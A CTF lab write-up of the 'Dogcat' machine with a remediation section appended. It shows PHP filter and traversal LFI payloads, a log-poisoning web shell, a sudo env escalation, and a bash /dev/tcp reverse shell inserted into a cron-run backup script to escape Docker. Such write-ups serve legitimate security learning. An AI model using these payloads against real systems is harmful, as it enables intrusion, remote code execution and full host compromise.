```markdown
# Dogcat — Full Kill Chain Write-Up  
**By Mohammad Meraj**  
**Date: 8-12-2025**  

---

## 🎯 Target
```

10.81.182.36

```

---

##  1. Reconnaissance

Initial nmap scan:

```

nmap -sS -sV -oN nmap/initial -T 4 10.81.182.36

![alt text](<Images/Screenshot 2025-12-08 164213.png>)

```

**Open ports found:**
- **22/tcp** → SSH  
- **80/tcp** → HTTP  

---

## 🐶🐱 2. Exploring the Web Application

Visiting the website showed a simple "dog/cat" viewing page:

```

[http://10.81.182.36/?view=dog]

![alt text](<Images/Screenshot 2025-12-08 161428.png>)

```

I suspected **Local File Inclusion (LFI)**.

A classic traversal attempt:

```

[http://10.81.182.36/?view=../../../etc/passwd]

![alt text](<Images/Screenshot 2025-12-08 161458.png>)

```

But the backend was enforcing a **substring whitelist** for `"dog"` or `"cat"` — blocking traversal.

---

## 🔍 3. Source Code Disclosure via PHP Filters

To bypass execution and retrieve raw code, I used:

```

[http://10.81.182.36/?view=php://filter/convert.base64-encode/resource=dog]

![alt text](<Images/Screenshot 2025-12-08 161926.png>)



```

Success — so I attempted to retrieve the index page:

![alt text](<Images/Screenshot 2025-12-08 162657.png>)

```

[http://10.81.182.36/?view=php://filter/convert.base64-encode/resource=dog/../index]

```

Decoded using:

```

echo "<BASE64_STRING>" | base64 -d > index.php

![alt text](<Images/Screenshot 2025-12-08 162440.png>)

````

Opening `index.php` revealed:

```php
if (containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat'))

![alt text](<Images/Screenshot 2025-12-08 163309.png>)

````

This confirmed the **vulnerable substring whitelist** and explained why `/etc/passwd.php` failed.


---

## 🏳️ 4. Reading the First Flag

Using the same filter technique:

```
http://10.81.182.36/?view=php://filter/convert.base64-encode/resource=dog/../flag
```

Decoded and retrieved **Flag 1**.

![alt text](<Images/Screenshot 2025-12-08 164213.png>)

---

## 📂 5. Bypassing the Auto-Added Extension

The backend appended `.php` to filenames.
To force reading real files (e.g., `/etc/passwd`) I set `ext=` to blank:

```
http://10.81.182.36/?view=dog../../../../../etc/passwd&ext=
```
![alt text](<Images/Screenshot 2025-12-08 164422.png>)

Now the server read the actual file.

---

## 📜 6. Log Poisoning for Remote Code Execution

Locate Apache logs:

```
/var/log/apache2/access.log

![alt text](<Images/Screenshot 2025-12-08 164703.png>)

```

Access it via LFI:

```
http://10.81.182.36/?view=dog../../../../../var/log/apache2/access.log&ext=

![alt text](<Images/Screenshot 2025-12-08 164757.png>)

```

Inject PHP payload into logs using the User-Agent header:

```
<?php system($_GET['cmd']); ?>
```

Then access it to execute commands, confirming RCE:

```
http://10.81.182.36/?view=dog../../../../../var/log/apache2/access.log&ext=&cmd=id
```

Next, crafted a URL-encoded PHP reverse shell payload.
Started listener:

![alt text](<Images/Screenshot 2025-12-08 170414.png>)

```
nc -lvnp 4444

![alt text](<Images/Screenshot 2025-12-08 170526.png>)

```

Triggered request → **Reverse shell obtained**.

---

## 🪜 7. Container Enumeration & Privilege Escalation

Moved around filesystem → found **another flag**.

![alt text](<Images/Screenshot 2025-12-08 170632.png>)

Checked sudo privileges:

```
sudo -l
```

Found:

```
(ALL) NOPASSWD: /usr/bin/env
```

Used it to escalate inside container:

```
sudo /usr/bin/env /bin/sh -i
```

Now **root inside the Docker container** → retrieved **third flag**.

![alt text](<Images/Screenshot 2025-12-08 170801.png>)

---

## 🐳 8. Escaping the Docker Container (Host Root)

Inside container, found `/opt/backups/backup.sh`.

This script runs automatically — perfect for exploitation.

Inserted a Bash reverse shell:

```
bash -i >& /dev/tcp/<YOUR-IP>/<PORT> 0>&1
```
![alt text](<Images/Screenshot 2025-12-08 171212.png>)

Saved changes → set listener → waited.

When backup job executed, I received a new reverse shell.

![alt text](<Images/Screenshot 2025-12-08 172047.png>)

Checked privileges:

```
id
```

**This time I was REAL SYSTEM ROOT (host machine).**

Navigated to `/root` on host → retrieved **final flag**.

![alt text](<Images/Screenshot 2025-12-08 172229.png>)

---

## 🏁 9. Final Outcome

* LFI → bypass whitelist
* Source code disclosure
* Extension manipulation
* Log poisoning → RCE
* Reverse shell
* Container privilege escalation
* Docker escape via backup script hijacking
* Host-level root shell
* All flags captured

# Remediation & Risk Rating  


## Risk Rating (Overall)

**Risk Level: CRITICAL**  
Because the vulnerability chain allows:

- Arbitrary file read  
- Remote Code Execution (RCE)  
- Privilege escalation  
- Docker/container breakout  
- Full host compromise  

This results in **complete system takeover**, data theft, service disruption, and pivoting potential.

---

# Detailed Risk Breakdown

## 1. Local File Inclusion (LFI)  
**Risk: HIGH → CRITICAL when chained**

### Impact:
- Disclosure of sensitive files  
- Source code exposure  
- SSRF-like behavior  
- Attackers can escalate to RCE through log poisoning or filter wrappers  

---

## 2. Weak Whitelisting (Substring Matching)  
**Risk: HIGH**

### Impact:
- Attacker bypasses validation using crafted payloads  
- Enables traversal + filtering tricks  
- Leads directly to file read and RCE  

---

## 3. Auto-Append of `.php` Extension  
**Risk: MEDIUM**

### Impact:
- Predictable behavior helps attacker bypass path checks  
- Combined with `ext=` manipulation → LFI unrestricted  

---

## 4. Log Poisoning Execution  
**Risk: CRITICAL**

### Impact:
- Direct execution of arbitrary code  
- No authentication needed  
- Creates easy reverse shell path  

---

## 5. Misconfigured `sudo` (NOPASSWD: /usr/bin/env)  
**Risk: CRITICAL**

### Impact:
- Instant privilege escalation to root  
- No password required  
- Allows arbitrary command execution  

---

## 6. Writable Backup Script (backup.sh)  
**Risk: CRITICAL**

### Impact:
- Attackers can implant persistence  
- Leads to host machine takeover  
- Bypasses container isolation  

---

# Remediation

## 1. **Fix the LFI Vulnerability**
- Use a strict allowlist of STATIC filenames.  
- Do NOT let user input touch file paths.  
- Never use string concatenation for file includes.  
- Replace dynamic includes with safe routing.

Example (safe):

```php
$pages = ['dog' => 'dog.php', 'cat' => 'cat.php'];
if (isset($pages[$_GET['view']])) {
    include $pages[$_GET['view']];
}
````

---

## 2. **Remove php://filter and wrapper access**

Disable dangerous PHP wrappers:

```
php_admin_value disable_functions "allow_url_fopen, allow_url_include"
```

---

## 3. **Sanitize User Input Properly**

* Remove `../`, `%2e%2e`, null-byte, stream wrappers
* Use `realpath()` checks to enforce directory boundaries

---

## 4. **Avoid Auto-Adding Extensions**

If extension is required, enforce it server-side, not in URL parameters.

---

## 5. **Protect Log Files**

* Store logs outside the webroot
* Disable PHP execution on log directories
* Enforce `open_basedir` restrictions
* Set correct permissions (non-writable for www-data)

---

## 6. **Fix sudo Misconfiguration**

Remove dangerous rules:

```
(ALL) NOPASSWD: /usr/bin/env
```

Replace with:

```
username ALL=(root) /usr/bin/safe_command_only
```

`env` should **never** be allowed, as it can spawn arbitrary binaries.

---

## 7. **Secure Docker & Container Isolation**

* Mount root filesystem as read-only
* Prevent container access to sensitive host directories
* Use non-root users inside containers
* Disable writable scripts triggered by cron/system services

---

## 8. **Protect backup scripts**

* Set file permissions:

```
chmod 700 backup.sh
chown root:root backup.sh
```

* Do NOT let web-service users modify system scripts
* Store automation scripts outside container mounts

---

## 9. **General Hardening**

### A. Disable execution in web directories:

```
<Directory "/var/www/html">
    php_admin_flag engine off
</Directory>
```

### B. Keep PHP and Apache fully updated.

### C. Use WAF or input filtering to block traversal patterns.

### D. Proper logging and intrusion detection.

---

# Final Assessment

**Vulnerability Class:**
LFI → RCE → Priv Esc → Container Escape → Host Takeover

**Overall Risk Rating:**

# **CRITICAL (10/10)**

This chain provides complete system compromise and must be remediated immediately.